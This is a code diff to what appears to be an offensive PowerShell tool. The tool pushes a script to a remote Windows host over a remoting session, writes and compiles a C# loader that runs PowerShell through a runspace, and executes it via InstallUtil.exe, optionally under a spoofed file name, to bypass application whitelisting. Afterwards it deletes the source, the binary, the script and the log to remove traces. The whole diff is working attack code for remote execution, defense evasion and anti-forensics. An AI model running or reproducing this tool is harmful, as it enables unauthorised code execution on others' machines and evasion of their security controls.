@@ -1,4 +1,4 @@
-﻿ write-host "
+ write-host "
    ____                            |  /   
  |      |\    |  _____     /\      | /
  |      | \   | |         /  \     |/
@@ -83,8 +83,14 @@ Write-Host "You have a session open"
 } #End Else
 
 #This is where it starts to create the C script and executable for the execution of the function
+$filebytes=Get-Content -Path $filepath -Encoding Byte
+Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("$using:filepath",$using:filebytes)}
+
+
+
+
 $itempath="C:\Users\$env:username\Desktop\standardfile.cs"
-New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -Value "using System;
+invoke-command -Session $session{ New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -115,33 +121,26 @@ New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -
  pipeline.Invoke();
  }
  }
- "
+ "}
 
-Add-Content -Value $Functioncommand -Path $filepath;
+invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path $using:filepath;}
 
-cd $realpath
+invoke-command -Session $session{ cd $using:realpath}
 $command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\Users\$env:username\Desktop\standardfile.exe`" `"$itempath`""
-Invoke-Expression -Command $command
+Invoke-Command -Session $session{ Invoke-Expression -Command $using:command}
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
-[System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$Spoofname",$SpoofContent)
-cd C:\users\$env:username\desktop
+invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$using:Spoofname",$using:SpoofContent)}
+invoke-command -Session $session{ cd C:\users\$env:username\desktop}
 $command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
 Invoke-Command -Session $session {cd $using:realpath; Invoke-Expression -Command $using:command2}
-$removalstuff=Get-Content -Path $filepath | Out-String
-$removalstuff=$removalstuff.Replace("$Functioncommand","")
-Clear-Content -Path $filepath
-Add-Content -Path $filepath -Value $removalstuff
-}#End Spoof
-
+Invoke-Command -Session $session {Remove-Item -Path C:\Users\$env:username\desktop\standardfile.cs;Remove-Item -Path C:\Users\$env:username\desktop\standardfile.exe;Remove-Item -Path $using:filepath;Remove-Item -Path C:\users\$env:username\desktop\log.txt}
+}
 else{
-$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
+$command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
-$removalstuff=Get-Content -Path $filepath | Out-String
-$removalstuff=$removalstuff.Replace("$Functioncommand","")
-Clear-Content -Path $filepath
-Add-Content -Path $filepath -Value $removalstuff
+Invoke-Command -Session $session {Remove-Item -Path C:\Users\$env:username\desktop\standardfile.cs;Remove-Item -Path C:\Users\$env:username\desktop\standardfile.exe;Remove-Item -Path $using:filepath;Remove-Item -Path C:\users\$env:username\desktop\log.txt}
 }#EndElse
 }#End RunRemote
 
